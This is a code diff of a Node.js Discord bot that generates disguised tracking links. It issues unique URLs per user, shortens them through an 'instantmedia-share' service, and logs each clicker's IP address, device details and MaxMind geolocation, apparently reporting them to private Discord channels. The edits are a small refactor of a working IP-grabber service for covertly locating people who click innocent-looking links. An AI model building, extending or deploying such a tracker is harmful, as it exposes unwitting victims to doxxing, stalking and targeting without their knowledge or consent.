@@ -25,7 +25,6 @@ app.use(cors());
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
-const SHORTLINK_BASE_URL = 'https://instantmedia-share.onrender.com';
 const BDC_TOKEN = process.env.BDC_TOKEN;
 const CLIENTS_FILE = './clients.json';
 const deviceDetector = new DeviceDetector();
@@ -36,10 +35,10 @@ const maxmind = require('maxmind');
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-// Fonction pour raccourcir un lien avec ton shortlink personnel
+// Fonction pour raccourcir avec ton propre serveur
 async function shortenWithInstantMediaShare(longUrl) {
   try {
-    const response = await axios.post(`${SHORTLINK_BASE_URL}/shorten`, {
+    const response = await axios.post('https://instantmedia-share.onrender.com/shorten', {
       url: longUrl
     });
     return response.data.shortUrl;
@@ -59,7 +58,6 @@ async function logIp(req, res, redirectUrl = null) {
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
 
-  // Ignore bots et inconnus
   if (!device.client?.name && !device.os?.name) {
     console.log(`⛔ Ignoré - Appareil inconnu pour IP ${ip}`);
     if (redirectUrl) {
@@ -210,8 +208,7 @@ client.on(Events.InteractionCreate, async interaction => {
     clients[uniqueId] = privateChannel.id;
     fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
   }
-});
-client.on(Events.InteractionCreate, async interaction => {
+
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_tracker_type') {
     if (interaction.replied || interaction.deferred) return;
     await interaction.reply({ content: "🔗 Génération de ton lien...", ephemeral: true });
@@ -221,8 +218,8 @@ client.on(Events.InteractionCreate, async interaction => {
     const selection = interaction.values[0];
     const shortId = crypto.randomBytes(3).toString("hex");
     const uniqueId = `${user.id}_${shortId}`;
-    const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
 
+    const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
     const generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
 
     const shortLink = await shortenWithInstantMediaShare(generatedUrl) || generatedUrl;
